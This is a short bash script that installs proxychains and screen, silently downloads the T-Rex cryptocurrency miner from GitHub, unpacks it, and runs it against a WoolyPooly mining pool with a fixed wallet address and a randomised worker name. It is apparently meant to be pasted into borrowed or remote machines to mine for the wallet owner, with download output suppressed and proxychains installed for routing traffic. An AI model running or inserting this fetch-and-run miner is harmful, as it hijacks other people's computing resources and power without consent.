#!/bin/bash

#!/bin/sh

#!/bin/bash

apt update

apt install proxychains

apt install screen -y

wget https://github.com/trexminer/T-Rex/releases/download/0.25.8/t-rex-0.25.8-linux.tar.gz >/dev/null 2>&1 

tar xf t-rex-0.25.8-linux.tar.gz

chmod +x t-rex >/dev/null 2>&1

bash ./t-rex -a blake3 -o stratum+tcp://pool.eu.woolypooly.com:3106 -u 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup -p x -w $(echo $(shuf -i 1-999999 -n 1)-MEKI)
